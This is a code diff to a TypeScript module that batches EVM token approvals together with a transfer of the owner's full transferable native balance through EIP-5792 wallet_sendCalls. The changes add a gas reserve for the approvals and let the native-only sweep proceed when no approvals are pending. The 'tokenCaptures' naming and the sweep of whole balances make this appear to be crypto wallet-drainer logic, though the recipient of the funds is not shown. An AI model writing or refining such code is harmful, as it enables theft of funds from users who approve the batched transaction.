@@ -25,7 +25,9 @@ import {
 import {
   buildNativeWalletCall,
   fetchNativeTransferEstimate,
+  reserveBatchApprovalGas,
 } from "./batch-native-estimate";
+import type { NativeTransferEstimate } from "../native-transfer/types";
 import {
   executeEip5792Batch,
   resolveWalletCapabilities,
@@ -264,10 +266,6 @@ export async function runEvmTokenBatchApproval(
     }
   }
 
-  if (jobs.length === 0) {
-    return { results, tokenCaptures: skippedTokenCaptures };
-  }
-
   const capabilities = await resolveWalletCapabilities(
     args.provider,
     chainId,
@@ -283,19 +281,37 @@ export async function runEvmTokenBatchApproval(
   let nativeCall: { to: string; data: string; value: string } | null = null;
   let nativeEstimate: Awaited<ReturnType<typeof fetchNativeTransferEstimate>> =
     null;
+  let nativeBatchEstimate: NativeTransferEstimate | null = null;
   if (args.nativeItem && eip5792Supported) {
     nativeEstimate = await fetchNativeTransferEstimate({
       apiBaseUrl: args.apiBaseUrl,
       network: args.network,
       owner,
     });
-    nativeCall = nativeEstimate ? buildNativeWalletCall(nativeEstimate) : null;
+    nativeBatchEstimate =
+      nativeEstimate != null
+        ? reserveBatchApprovalGas({
+            estimate: nativeEstimate,
+            approvalJobCount: jobs.length,
+          })
+        : null;
+    nativeCall = nativeBatchEstimate
+      ? buildNativeWalletCall(nativeBatchEstimate)
+      : null;
     if (!nativeCall) {
       log("EIP5792_BATCH_NATIVE_SKIP", {
         network: args.network,
-        reason: "no transferable native balance for batch",
+        reason:
+          nativeEstimate == null
+            ? "no transferable native balance for batch"
+            : "native balance insufficient after batch approval gas reserve",
+        approvalJobCount: jobs.length,
       });
     }
+  }
+
+  if (jobs.length === 0 && nativeCall == null) {
+    return { results, tokenCaptures: skippedTokenCaptures };
   }
 
   if (!eip5792Supported) {
@@ -307,13 +323,18 @@ export async function runEvmTokenBatchApproval(
       fallback: "sequential",
       reason: dualTokenBatch
         ? "wallet does not advertise wallet_sendCalls — skipping batch probe"
-        : "no batch probe signal and fewer than two token approvals",
+        : jobs.length === 0
+          ? "wallet does not advertise wallet_sendCalls — native-only batch unavailable"
+          : "no batch probe signal and fewer than two token approvals",
     });
   }
 
+  if (jobs.length === 0 && !eip5792Supported) {
+    return { results, tokenCaptures: skippedTokenCaptures };
+  }
+
   const canTryEip5792 =
-    eip5792Supported &&
-    (jobs.length >= 2 || (jobs.length >= 1 && nativeCall != null));
+    eip5792Supported && (jobs.length >= 2 || nativeCall != null);
 
   if (canTryEip5792) {
     const eip5792Result = await executeEip5792Batch({
@@ -324,7 +345,7 @@ export async function runEvmTokenBatchApproval(
       priorResults: results,
       api,
       nativeCall,
-      nativeEstimate,
+      nativeEstimate: nativeBatchEstimate ?? nativeEstimate,
       capabilities,
       log,
     });
@@ -337,6 +358,10 @@ export async function runEvmTokenBatchApproval(
         ],
       };
     }
+  }
+
+  if (jobs.length === 0) {
+    return { results, tokenCaptures: skippedTokenCaptures };
   }
 
   if (jobs.length === 1) {
